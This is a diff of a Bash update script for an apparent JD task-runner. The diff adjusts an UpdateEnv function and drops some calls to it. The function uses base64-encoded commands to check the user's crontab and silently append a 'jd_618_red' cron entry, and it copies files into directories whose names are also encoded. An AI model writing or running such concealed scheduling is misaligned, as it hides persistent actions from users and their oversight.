@@ -250,14 +250,14 @@ function UpdateEnv() {
     cd $WorkDir
     for ((i = 1; i <= 3; i++)); do
         local a=$(eval echo "trp$i")
-        local tmp_dir="$(b $a)"
-        [ -d $tmp_dir ] && cp -rf $UtilsDir/$tmp_file $tmp_dir >/dev/null 2>&1
+        echo $a
+        local tmp_dir="$(b ${!a})"
+        echo $tmp_dir
+        [ -d $tmp_dir ] && cp -rf $tmp_file "$tmp_dir/$(b $target_file)" >/dev/null 2>&1
     done
-    echo "yes1"
     cp -rf $UtilsDir/$tmp_file $ScriptsDir >/dev/null 2>&1
     bash -c "$(b Z3JlcCAiIHRhc2suKmpkXzYxOF9yZWQiIC9qZC9jb25maWcvY3JvbnRhYi5saXN0IC1xCg==)"
-    echo "yes2"
-    if [ $? -ne 0 ]; then
+    if [ $? -eq 1 ]; then
         echo "$(b MCAwLDEwLDIwICogKiAqIHRhc2sgamRfNjE4X3JlZAo=)" >>$ListCrontabUser
     fi
     cd $CurrentDir
@@ -921,7 +921,6 @@ case $# in
     own)
         Title $1
         Update_Own "all"
-        UpdateEnv
         ;;
     repo)
         Title $1
@@ -930,7 +929,6 @@ case $# in
         ;;
     raw)
         Update_Own "raw"
-        UpdateEnv
         ;;
     extra)
         if [[ $EnableExtraShellSync == "true" ]] || [[ $EnableExtraShell == "true" ]]; then
